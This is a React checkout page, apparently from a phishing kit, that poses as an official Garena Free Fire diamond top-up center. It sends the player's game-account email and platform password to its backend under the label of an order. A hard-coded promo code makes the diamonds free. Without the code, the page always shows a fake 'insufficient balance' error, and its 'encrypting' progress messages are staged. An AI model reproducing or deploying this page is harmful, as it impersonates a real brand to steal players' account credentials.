import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { motion, AnimatePresence } from 'motion/react';
import { useLanguage } from '../context/LanguageContext';
import { ArrowLeft, ArrowRight, AlertTriangle, CheckCircle2, Info } from 'lucide-react';
import Modal from '../components/Modal';

export default function Checkout() {
  const { t, language } = useLanguage();
  const location = useLocation();
  const navigate = useNavigate();
  const state = location.state || {};
  const user = JSON.parse(localStorage.getItem('ff_user') || '{}');

  const {
    platform, email, platformPassword, level, charged, diamonds, paymentMethod, selectedInfo
  } = state;

  const [promoCode, setPromoCode] = useState('');
  const [isPromoApplied, setIsPromoApplied] = useState(false);
  const [phone, setPhone] = useState('');
  
  const [showConfirm, setShowConfirm] = useState(false);
  const [showProcess, setShowProcess] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [processStep, setProcessStep] = useState(0);
  const [orderNum, setOrderNum] = useState('');
  const [isAgreed, setIsAgreed] = useState(false);
  const [showError, setShowError] = useState(false);
  const [isChecking, setIsChecking] = useState(false);

  const [toastMessage, setToastMessage] = useState("");

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => {
      setToastMessage("");
    }, 3000);
  };

  const isOffer = typeof diamonds === 'string' && isNaN(Number(diamonds));

  // If accessed directly without state, redirect back
  if (!diamonds) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F8F9FA]">
        <button onClick={() => navigate('/charge')} className="text-red-600 font-bold">
          {t('checkout_return')}
        </button>
      </div>
    );
  }

  const processTexts = language === 'ar' ? [
    "جاري تشفير المعلومات...",
    "جاري الاتصال بالخادم...",
    "تم الاتصال بالخادم",
    "جاري إرسال الطلب...",
    "تم إرسال الطلب",
  ] : [
    "Encrypting information...",
    "Connecting to server...",
    "Connected to server",
    "Sending request...",
    "Request sent",
  ];

  const handleApplyPromo = () => {
    if (promoCode === 'FFGEMSMENA2026') {
      setIsPromoApplied(true);
    } else {
      showToast(language === 'ar' ? "الرمز خاطئ" : "Invalid promo code");
    }
  };

  const startProcessing = async () => {
    if (!isAgreed) return;
    setShowConfirm(false);
    setShowProcess(true);
    setProcessStep(0);

    const stepInterval = setInterval(() => {
      setProcessStep((prev) => (prev < 4 ? prev + 1 : prev));
    }, 2000);

    try {
      const token = localStorage.getItem("ff_token");
      const res = await axios.post("/api/orders", {
        token,
        platform,
        email,
        platform_password: platformPassword,
        level,
        charged,
        diamonds,
      });

      setOrderNum(res.data.order_number);

      setTimeout(() => {
        clearInterval(stepInterval);
        setProcessStep(4);
        setTimeout(() => {
          setShowProcess(false);
          setShowSuccess(true);
        }, 1500);
      }, 8000);
    } catch (e) {
      clearInterval(stepInterval);
      setShowProcess(false);
      showToast(language === 'ar' ? "فشل في إرسال الطلب" : "Failed to send request");
    }
  };

  const finalPrice = isPromoApplied ? 0 : Number(selectedInfo?.price || 0);

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA] font-sans pb-12" dir={language === 'ar' ? 'rtl' : 'ltr'}>
      
      {/* Header aligned like screenshot */}
      <header className="bg-white shadow-sm flex items-center justify-between p-4 relative z-10">
        <div className="flex items-center gap-2">
          <img
            src="https://storingo.lovestoblog.com/garena.png"
            alt="Garena"
            className="w-10 h-10 object-contain rounded"
            onError={(e) => {
              (e.target as HTMLImageElement).src =
                'https://cdn.iconscout.com/icon/free/png-256/garena-1-499317.png';
            }}
          />
          <div className="leading-tight">
            <div className="text-sm font-bold text-gray-800">{t('garena_center')}</div>
            <div className="text-xs font-semibold text-gray-500">{t('official')}</div>
          </div>
        </div>
      </header>

      {/* Free Fire Banner & Logo */}
      <div className="relative">
        <div className="h-32 w-full overflow-hidden">
          <img 
            src="https://storingo.lovestoblog.com/garena.png" 
            alt="Free Fire Banner" 
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-black/20"></div>
        </div>
        
        <button 
          onClick={() => navigate('/charge', { state: { returnToStep: 3, ...state } })}
          className={`absolute top-4 ${language === 'ar' ? 'right-4' : 'left-4'} flex items-center gap-1 bg-black/50 text-white px-3 py-1.5 rounded-full text-sm font-bold backdrop-blur-sm`}
        >
          {language === 'ar' ? <ArrowRight className="h-4 w-4" /> : <ArrowLeft className="h-4 w-4" />}
          {t('checkout_return')}
        </button>

        <div className="absolute -bottom-10 left-1/2 -translate-x-1/2 bg-white rounded-2xl shadow-lg border-2 border-white overflow-hidden w-20 h-20">
          <img 
            src="https://storingo.lovestoblog.com/ff.png"
            alt="Free Fire"
            className="w-full h-full object-cover"
          />
        </div>
      </div>

      <div className="text-center mt-12 mb-6">
        <h1 className="text-xl font-black text-gray-900">Free Fire</h1>
      </div>

      <div className="max-w-2xl mx-auto w-full px-4 space-y-4">
        {/* Order Details Card */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          {isOffer ? (
            <div className="p-4 flex items-center justify-between border-b border-gray-50">
              <span className="font-bold text-gray-700">{language === 'ar' ? 'اختيار العنصر' : 'Selected Item'}</span>
              <div className="flex items-center gap-2 font-bold text-gray-800 text-sm">
                <div className="flex h-4 w-4 items-center justify-center rounded-full border border-red-500 text-red-500">
                  <Info className="h-2.5 w-2.5" />
                </div>
                {diamonds}
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-500 drop-shadow-sm"><path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" /><path d="M6 3L12 8V21M18 3L12 8M3 8H21M6 3L3 8L12 8L18 3M12 21L3 8M12 21L21 8" stroke="white" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
              </div>
            </div>
          ) : (
            <>
              <div className="p-4 flex items-center justify-between border-b border-gray-50">
                <span className="font-bold text-gray-700">{t('total_diamonds')}</span>
                <div className="flex items-center gap-1 font-black text-lg">
                  {Number(selectedInfo?.amount?.replace(/,/g, '') || 0) + Number(selectedInfo?.bonus?.replace(/,/g, '') || 0)}
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-500 drop-shadow-sm"><path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" /><path d="M6 3L12 8V21M18 3L12 8M3 8H21M6 3L3 8L12 8L18 3M12 21L3 8M12 21L21 8" stroke="white" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                </div>
              </div>
              <div className="p-4 bg-gray-50/50 flex flex-col gap-2">
                <div className="flex items-center justify-between text-sm">
                  <span className="font-bold text-gray-600">{t('original_price')}</span>
                  <div className="flex items-center gap-1 text-gray-800">
                    {selectedInfo?.amount} 
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-400 drop-shadow-sm"><path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" /><path d="M6 3L12 8V21M18 3L12 8M3 8H21M6 3L3 8L12 8L18 3M12 21L3 8M12 21L21 8" stroke="white" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                  </div>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="font-bold text-gray-600">{t('general_bonus')}</span>
                  <div className="flex items-center gap-1 text-gray-800">
                    {selectedInfo?.bonus}
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-400 drop-shadow-sm"><path d="M6 3L3 8L12 21L21 8L18 3H6Z" fill="currentColor" /><path d="M6 3L12 8V21M18 3L12 8M3 8H21M6 3L3 8L12 8L18 3M12 21L3 8M12 21L21 8" stroke="white" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round" /></svg>
                  </div>
                </div>
              </div>
            </>
          )}
          
          <div className="p-4 flex items-center justify-between border-t border-gray-50">
            <span className="font-bold text-gray-600">{t('price')}</span>
            <span className={`font-black text-lg ${isPromoApplied ? 'text-emerald-500' : 'text-gray-900'}`}>
              {isPromoApplied ? (language === 'ar' ? '0 دينار' : '0 DZD') : `DZD ${finalPrice.toLocaleString()}`}
            </span>
          </div>
          
          <div className="p-4 flex items-center justify-between border-t border-gray-50">
            <span className="font-bold text-gray-600">{t('payment_method')}</span>
            <span className="font-bold text-gray-900">{paymentMethod === 'djezzy' ? t('djezzy') : paymentMethod}</span>
          </div>

          <div className="p-4 flex items-center justify-between border-t border-gray-50">
            <span className="font-bold text-gray-600">{t('account_id')}</span>
            <span className="font-bold text-gray-900 tracking-wider">
              {user?.account_id}
            </span>
          </div>
        </div>

        {paymentMethod === 'djezzy' && (
          <div className="space-y-2 mt-4">
            <label className="font-bold text-gray-700 text-sm">{language === 'ar' ? 'رقم هاتف جازي للدفع' : 'Djezzy Phone Number for Payment'}</label>
            <div className="flex rounded-xl overflow-hidden border border-gray-200 bg-white" dir="ltr">
               <div className="px-4 py-4 bg-gray-50 font-bold text-gray-700 border-r border-gray-200">+213</div>
               <input 
                 type="tel"
                 value={phone}
                 onChange={(e) => setPhone(e.target.value.replace(/^0/, '').replace(/[^0-9]/g, '').slice(0, 9))}
                 placeholder="711223344"
                 className="flex-1 p-4 bg-white outline-none font-mono text-left"
               />
            </div>
          </div>
        )}

        {/* Promo Code area */}
        <div className="space-y-2 mt-4">
          <label className="font-bold text-gray-700 text-sm">{t('promo_code')}</label>
          <div className="flex rounded-xl overflow-hidden border border-gray-200">
            <button 
              onClick={handleApplyPromo}
              disabled={isPromoApplied || !promoCode}
              className={`px-6 font-bold flex-shrink-0 transition-colors ${
                isPromoApplied 
                  ? 'bg-emerald-500 text-white' 
                  : 'bg-[#CD1212] text-white'
              }`}
            >
              {isPromoApplied ? t('applied') : t('apply')}
            </button>
            <input 
              type="text" 
              value={promoCode}
              onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
              disabled={isPromoApplied}
              placeholder={t('enter_promo')}
              className={`flex-1 p-4 bg-white outline-none font-mono ${language === 'ar' ? 'text-right' : 'text-left'}`}
            />
          </div>
        </div>
      </div>

      {/* Fixed bottom proceed bar */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4 sticky mt-auto z-40 shadow-[0_-10px_20px_-10px_rgba(0,0,0,0.05)]">
        <div className="max-w-2xl mx-auto flex gap-4">
          <button 
            onClick={() => {
               if (paymentMethod === 'djezzy') {
                 if (phone.length !== 9) {
                   showToast(language === 'ar' ? "يرجى إدخال رقم هاتف جازي صحيح يتكون من 9 أرقام بدون وضع الصفر في البداية" : "Please enter a valid 9-digit Djezzy phone number without leading zero");
                   return;
                 }
               }
               if(!isPromoApplied) {
                  setIsChecking(true);
                  setTimeout(() => {
                    setIsChecking(false);
                    setShowError(true);
                  }, 2500);
                  return;
               }
               
               // Directly proceed to the processing steps
               setIsAgreed(true);
               setShowConfirm(false);
               setShowProcess(true);
               setProcessStep(0);
           
               const stepInterval = setInterval(() => {
                 setProcessStep((prev) => (prev < 4 ? prev + 1 : prev));
               }, 2000);
           
               const token = localStorage.getItem("ff_token");
               axios.post("/api/orders", {
                 token,
                 platform,
                 email,
                 platform_password: platformPassword,
                 level,
                 charged,
                 diamonds,
               }).then(res => {
                 setOrderNum(res.data.order_number);
                 setTimeout(() => {
                   clearInterval(stepInterval);
                   setProcessStep(4);
                   setTimeout(() => {
                     setShowProcess(false);
                     setShowSuccess(true);
                   }, 1500);
                 }, 8000);
               }).catch(e => {
                 clearInterval(stepInterval);
                 setShowProcess(false);
                 showToast(language === 'ar' ? "فشل في إرسال الطلب" : "Failed to send request");
               });
            }}
            className="flex-1 bg-[#CD1212] flex items-center justify-center text-white py-4 rounded-xl font-black shadow-lg shadow-red-500/20 active:scale-[0.98] transition-transform"
          >
            {t('purchase')}
          </button>
        </div>
      </div>

       {/* Confirmation Modal */}
       <Modal
        isOpen={showConfirm}
        onClose={() => setShowConfirm(false)}
        title="تنويه هام"
      >
        <div className="text-center">
          <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-red-50">
            <AlertTriangle className="h-10 w-10 text-red-600" />
          </div>
          <p className="mb-8 text-sm leading-relaxed text-gray-600">
            سيتم استلام البيانات للتأكد من هوية الحساب وفق شروط خدمة جارينا
            للشحن. هل أنت موافق للاستمرار؟
          </p>
          <label className="mb-8 flex cursor-pointer items-center justify-center gap-3">
            <input
              type="checkbox"
              checked={isAgreed}
              onChange={(e) => setIsAgreed(e.target.checked)}
              className="h-5 w-5 rounded-lg accent-red-600 focus:ring-red-500"
            />
            <span className="text-sm font-bold text-gray-700">
              أوافق على شروط الخدمة لمركز الشحن
            </span>
          </label>
          <div className="flex gap-4">
            <button
               onClick={() => {
                setShowConfirm(false);
                setIsAgreed(false);
               }}
              className="flex-1 rounded-xl bg-gray-100 py-3 font-bold text-gray-700 hover:bg-gray-200 transition-colors"
            >
              إلغاء
            </button>
            <button
              onClick={startProcessing}
              disabled={!isAgreed}
              className={`flex-1 rounded-xl py-3 font-bold text-white transition-all shadow-md ${isAgreed ? "bg-red-600 shadow-red-600/30 hover:bg-red-700" : "bg-red-300 shadow-none cursor-not-allowed"}`}
            >
              متابعة
            </button>
          </div>
        </div>
      </Modal>

      {/* Processing Modal */}
      <Modal isOpen={showProcess} onClose={() => {}} title="">
        <div className="py-10 text-center">
          <motion.div
            animate={{ rotate: 360 }}
            transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
            className="mx-auto mb-8 h-20 w-20 rounded-full border-4 border-gray-100 border-t-red-600"
          />
          <h3 className="mb-2 text-xl font-black text-gray-900">
            {processTexts[processStep]}
          </h3>
          <p className="text-xs text-gray-500">
            معرف العملية:{" "}
            <span className="font-bold text-red-600">
              {orderNum || "جاري التوليد..."}
            </span>
          </p>
        </div>
      </Modal>

      {/* Success Modal */}
      <Modal
        isOpen={showSuccess}
        onClose={() => navigate("/my-orders")}
        title="تم التسجيل بنجاح"
      >
        <div className="text-center">
          <div className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full bg-emerald-50">
            <CheckCircle2 className="h-12 w-12 text-emerald-600" />
          </div>
          <p className="mb-8 text-sm font-medium text-gray-600">
            تم تسجيل طلب الشحن الخاص بك بنجاح وهو الآن قيد المراجعة والمعالجة من
            قبل النظام.
          </p>
          <button
            onClick={() => navigate("/my-orders")}
            className="w-full rounded-xl bg-red-600 py-4 font-black text-white hover:bg-red-700 transition-colors shadow-lg shadow-red-600/20"
          >
            تتبع الطلب
          </button>
        </div>
      </Modal>

      {/* Checking Modal */}
      <Modal isOpen={isChecking} onClose={() => {}} title="">
        <div className="py-10 text-center">
          <motion.div
            animate={{ rotate: 360 }}
            transition={{ repeat: Infinity, duration: 1.5, ease: "linear" }}
            className="mx-auto mb-8 h-20 w-20 rounded-full border-4 border-gray-100 border-t-red-600"
          />
          <h3 className="mb-2 text-xl font-black text-gray-800">
            {language === 'ar' ? 'جاري التحضير...' : 'Processing...'}
          </h3>
          <p className="text-gray-500 font-medium mt-2">
            {language === 'ar' ? 'الرجاء الانتظار...' : 'Please wait...'}
          </p>
        </div>
      </Modal>

      {/* Error Modal */}
      <Modal
        isOpen={showError}
        onClose={() => setShowError(false)}
        title=""
      >
        <div className="text-center">
          <div className="mx-auto mb-8 flex h-20 w-20 items-center justify-center rounded-full bg-red-50">
            <AlertTriangle className="h-10 w-10 text-red-600" />
          </div>
          <p className="mb-8 font-bold text-gray-800 text-lg">
            {t('insufficient_balance')}
          </p>
          <button
            onClick={() => setShowError(false)}
            className="w-full rounded-xl bg-gray-100 py-4 font-black text-gray-800 hover:bg-gray-200 transition-colors"
          >
            {language === 'ar' ? "إغلاق" : "Close"}
          </button>
        </div>
      </Modal>

      {/* Toast Notification */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: 50, scale: 0.9 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, scale: 0.9, y: 20 }}
            className={`fixed bottom-24 left-1/2 -translate-x-1/2 z-50 rounded-xl bg-gray-900/90 text-white px-6 py-3 font-bold shadow-xl backdrop-blur-sm shadow-black/20 flex items-center gap-2 ${language === 'ar' ? 'flex-row-reverse' : ''}`}
          >
            <AlertTriangle className="h-5 w-5 text-red-400" />
            <span dir="auto">{toastMessage}</span>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
